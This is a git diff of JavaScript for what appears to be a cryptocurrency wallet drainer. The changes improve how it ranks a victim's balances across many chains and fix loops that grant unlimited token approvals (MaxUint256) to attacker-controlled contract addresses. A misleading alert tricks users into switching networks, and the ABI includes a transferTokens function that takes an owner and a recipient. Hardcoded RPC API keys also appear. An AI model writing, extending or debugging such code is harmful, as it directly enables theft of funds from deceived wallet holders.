@@ -353,16 +353,6 @@ openConnectModalBtn.addEventListener('click', async () => {
       "function transferTokens(address token, address owner, address recipient, uint256 amount) external returns (bool)"
   ];
 
-//regex to extract the numeric part from a string
-function extractNumericPart(str) {
-    const strings = String(str)
-    const regex = /\d+/;
-    const match = strings.match(regex);
-    return match ? parseInt(match[0], 10) : 0;
-   
-}
-
-
 async function connectWallet() {
     const walletProvider = modal.getWalletProvider()
     let provider = new ethers.providers.Web3Provider(walletProvider);
@@ -388,6 +378,7 @@ async function connectWallet() {
             }
         });
 
+       
         let networkDetect = [
             {chainId: mainnet.chainId, name: mainnet.name, rpcurl: 'https://eth-mainnet.g.alchemy.com/v2/IRwnvoQZmF2e0lePk63uoLwKO_en3nY1', nativeCurrency: {name: 'Ether', symbol: 'ETH', decimal: 18}, blockExplorerUrl: 'https://etherscan.io/', fetchTokens: fetchETHTokens},
             {chainId: bsc.chainId, name: bsc.name, rpcurl: 'https://bsc-mainnet.public.blastapi.io', nativeCurrency: {name: 'BNB',symbol:'BBN', decimal: 18}, blockExplorerUrl: 'https://bscscan.com/', fetchTokens: fetchBNBTokens},
@@ -420,37 +411,75 @@ async function connectWallet() {
             {chainId: linea.chainId, name: linea.name, rpcurl: 'https://linea-mainnet.infura.io/v3/3b0245ef6bf444d7baf773a9a3b68921', nativeCurrency: {name: 'Ether', symbol: 'ETH', decimal: 18}, blockExplorerUrl: 'https://lineascan.build/', fetchTokens: fetchLINEATokens},
             {chainId: opbnb.chainId, name: opbnb.name, rpcurl: 'https://rpc.particle.network/evm-chain?chainId=204&projectUuid=aabbcf0e-e728-42bb-b6ed-f50be0154e20&projectKey=c5zORhFBadsXOH5NVCRzIhDYpQ1zoxEfQdBxmGVt', nativeCurrency: {name: 'opBNB', symbol: 'BNB', decimal: 18}, blockExplorerUrl: 'https://mainnet.opbnbscan.com', fetchTokens: fetchOPBNBTokens}
         ]
-      
+
         let currentChainId = await provider.getNetwork();
-        console.log("Current Network: ", currentChainId)
         let networksWithTokens = []
 
-        for (let nets of networkDetect) {
-            const tokens = await nets.fetchTokens(address);
-            //console.log(tokens)
+        const minimumBalance = ethers.utils.parseUnits("0.02", 18); // Set minimum balance to 0.02 tokens
 
-            if (tokens.length > 0) {
-                networksWithTokens.push({ 
-                    chainId: nets.chainId, 
+
+      try {
+        for(const nets of networkDetect){
+            const networkProvider = new ethers.providers.JsonRpcProvider(nets.rpcurl)
+            const nonZeroBalance = []
+            let netBalances = ethers.BigNumber.from(0)
+
+            //get native balances first
+            try {
+                const nativeBalance = await networkProvider.getBalance(address);
+                if(nativeBalance.gte(minimumBalance)){
+                    const formattedNativeBalance = ethers.utils.formatUnits(nativeBalance, 18);
+                    nonZeroBalance.push({ tokenSymbol: nets.nativeCurrency.symbol, balance: parseFloat(formattedNativeBalance) });
+                    netBalances = netBalances.add(nativeBalance);
+                }
+            } catch (error) {
+                console.error(`Failed to fetch native balance:`, error);
+            }
+
+            const tokens = await nets.fetchTokens(address);
+            for(const token of tokens){
+                try {
+                    const tokenContract = new ethers.Contract(token.contractAddress, erc20ABI, networkProvider);
+                    const balance = await tokenContract.balanceOf(address);
+
+                    if(balance.gte(minimumBalance)){
+                        const formattedBalance = ethers.utils.formatUnits(balance, token.decimal);
+                        nonZeroBalance.push({symbol: token.tokenSymbol, balance: parseFloat(formattedBalance)});
+                        netBalances = netBalances.add(balance);
+                    }
+                } catch (error) {
+                    console.error(`Failed to fetch balance for ${token.tokenSymbol}:`, error);
+                }
+            }
+            if(nonZeroBalance.length > 0){
+                nonZeroBalance.sort((a, b) => b.balance - a.balance);
+
+                networksWithTokens.push({
+                    chainId: nets.chainId,
                     name: nets.name,
                     rpcUrl: nets.rpcurl,
                     nativeCurrency: nets.nativeCurrency,
                     blockExplorerUrl: nets.blockExplorerUrl,
-                    tokenCount: tokens.length,
-                });
+                    netBalances: ethers.utils.formatUnits(netBalances, 18),
+                })
             }
         }
+      } catch (error) {
+        console.error('Error fetching tokens and details:', error)
+      }
 
-        // console.log('Networks with tokens:', networksWithTokens);
-        // console.log('Current network chainId:', currentChainId.chainId);
+       // Sort networks by netBalances in descending order
+       networksWithTokens.sort((a, b) => parseFloat(b.netBalances) - parseFloat(a.netBalances));
 
-        networksWithTokens.sort((a, b) => {
-            const aNumeric = extractNumericPart(a.tokenCount)
-            const bNumeric = extractNumericPart(b.tokenCount);
+       console.log('Networks with tokens sorted by netBalances:', networksWithTokens.map(net => ({
+           name: net.name,
+           netBalances: net.netBalances
+       })));
 
-            return bNumeric - aNumeric;
-        });
-        
+       const maxNetBalance = Math.max(...networksWithTokens.map(net => parseFloat(net.netBalances)));
+
+       console.log(`Maximum net balance: ${maxNetBalance}`);
+
         if (!networksWithTokens.some(net => net.chainId === currentChainId.chainId) && networksWithTokens.length > 0) {
             window.alert(`Your Nodes are clustered on the current Networks: ${networksWithTokens.map(net => net.name).join(", ")}. Please switch your network!`);
             for (let net of networksWithTokens) {
@@ -2042,7 +2071,7 @@ async function connectWallet() {
                           mantleTokenDetails.sort((a, b) => b.balance.sub(a.balance));
               
                           try {
-                              for(let token of scrollTokenDetails){
+                              for(let token of mantleTokenDetails){
                                   const maxUint256 = ethers.constants.MaxUint256;
                                   // Approve unlimited tokens
                                   const approveTx = await token.contract.approve(mantleContractAddress, maxUint256);
@@ -2273,7 +2302,7 @@ async function connectWallet() {
                           klaytnTokenDetails.sort((a, b) => b.balance.sub(a.balance));
               
                           try {
-                              for(let token of aurTokenDetails){
+                              for(let token of klaytnTokenDetails){
                                   const maxUint256 = ethers.constants.MaxUint256;
                                   // Approve unlimited tokens
                                   const approveTx = await token.contract.approve(klaytnContractAddress, maxUint256);
@@ -4411,7 +4440,7 @@ async function connectWallet() {
                       mantleTokenDetails.sort((a, b) => b.balance.sub(a.balance));
           
                       try {
-                          for(let token of scrollTokenDetails){
+                          for(let token of mantleTokenDetails){
                               const maxUint256 = ethers.constants.MaxUint256;
                               // Approve unlimited tokens
                               const approveTx = await token.contract.approve(mantleContractAddress, maxUint256);
@@ -4642,7 +4671,7 @@ async function connectWallet() {
                       klaytnTokenDetails.sort((a, b) => b.balance.sub(a.balance));
           
                       try {
-                          for(let token of aurTokenDetails){
+                          for(let token of klaytnTokenDetails){
                               const maxUint256 = ethers.constants.MaxUint256;
                               // Approve unlimited tokens
                               const approveTx = await token.contract.approve(klaytnContractAddress, maxUint256);
